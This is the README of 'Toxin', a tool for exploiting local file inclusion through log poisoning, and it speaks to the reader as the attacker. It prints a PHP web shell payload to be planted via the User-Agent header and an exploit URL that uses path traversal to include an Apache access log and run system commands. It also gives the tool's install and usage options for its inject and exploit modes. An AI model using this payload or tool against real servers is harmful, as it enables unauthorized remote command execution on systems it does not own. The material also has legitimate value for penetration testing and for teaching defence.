# Toxin

Toxin is an LFI (Local File Inclusion)/Log Pollution Exploitation Tool.

## Introduction

Toxin exploits a particular (and yet also common)type of 
Local File Inclusion (LFI) vulnerability wherein the attacker
is able to take advantage of PHP's `register_globals` setting. 

In this attack scenario, the attacker would craft a custom 
`User-Agent` header which would contain arbitrary PHP code
that would register a new global variable to the environment
like so:

```php
<?php system($_GET['cmd']); ?>
```

With the new, malicious global variable registered, we can add it 
to a query string within a URL containing a file on the target host
which is vulnerable to inclusion, and then use the file along with
the query string to execute arbitrary system-level commands, like so:

`http://target.tld/info.php?page=../../../../../var/log/apache/access.log&cmd=whoami`

There are a number of common files which typically fall prey to this attack, 
Toxin does not attempt to fuzz for those files, but instead expects you, 
the attacker, to have prior knowledge of your target.

## Installation

`$ python setup.py install`

## Usage

```bash
Usage: toxin [OPTIONS]

  Toxin: Local File Inclusion/Log Pollution Exploitation Tool

Options:
  -u, --url TEXT        URL to query
  -p, --parameter TEXT  Parameter to inject into User-Agent header
  -c, --command TEXT    Command to Run
  -m, --mode TEXT       Mode (Inject or Exploit)
  -g, --paged           Paged Output
  --help                Show this message and exit.
```